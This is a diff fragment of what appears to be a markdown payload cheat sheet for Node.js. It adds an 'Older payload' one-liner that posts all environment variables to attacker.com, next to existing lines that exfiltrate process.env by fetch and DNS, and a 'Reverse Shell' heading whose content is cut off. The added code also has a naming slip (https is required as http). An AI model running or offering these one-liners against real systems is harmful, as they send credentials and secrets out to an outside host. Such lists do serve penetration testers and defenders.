@@ -48,6 +48,12 @@ node -e 'var dns=require("dns");dns.lookup("attacker.com",()=>({}))'
 node -e 'fetch("https://attacker.com/data",{method:"POST",body:JSON.stringify(process.env)});'
 ```
 
+Older payload (NodeJS < 18)
+
+```
+node -e 'var http = require("https");const data = JSON.stringify(process.env);const options = {hostname:"attacker.com",port: 443,path:"/",method:"POST",headers: {"Content-Type":"application/json"}};const req = https.request(options, (res) => {});req.write(data);req.end();'
+```
+
 ### Reverse Shell
 
 ```
